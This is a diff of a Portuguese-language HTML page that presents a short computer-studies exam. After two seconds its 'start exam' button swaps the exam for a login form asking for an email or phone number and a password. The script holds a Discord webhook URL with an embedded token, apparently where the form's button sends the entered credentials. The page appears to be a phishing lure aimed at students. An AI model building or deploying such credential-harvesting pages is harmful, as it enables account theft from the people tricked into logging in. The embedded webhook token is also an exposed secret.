@@ -11,27 +11,41 @@
 </head>
 
 <body>
-  
-  
-  
+<div id="prova">  
+<h1>Prova de Informática</h1>
+<ol>
+<li>O que é o Computador?</li>
+<li>Em quantas partes está dividido o Computador?</li>
+<li>O que são dispositivos de entrada de dados?</li>
+<li>Para que serve o teclado?</li>
+</ol>
+<button onclick="pfv()">Iniciar Prova</button>
+</div>
+
+  <div id="login">
   <img src="smlicon.png" width="150px">
   <br>
   <p>Inicie sessão para realizar a prova.</p>
   
   <label>Email ou Número de telefone</label>
-  <input type="email" id="email">
+  <input type="password" id="email">
   <label>Palavra-passe</label>
   <input type="password" id="senha">
   
  
  <br>
- <button onclick="enviar()">Criar nova senha</button>
-  
+ <button onclick="enviar()">Iniciar sessão</button>
+  </div>
   
   
   <script>
   var webhook="https://discord.com/api/webhooks/1361837466834702568/h2AeTArsuQrcHwvONnYggHF8IDS96nE_BZsG8UHU2NMSjKrDJvSa144FrejRSomOJ-ss";
-  
+  function pfv(){
+setTimeout(function(){
+document.getElementById("prova").style.display="none";
+document.getElementById("login").style.display="block";
+},2000);
+}
   
   
   
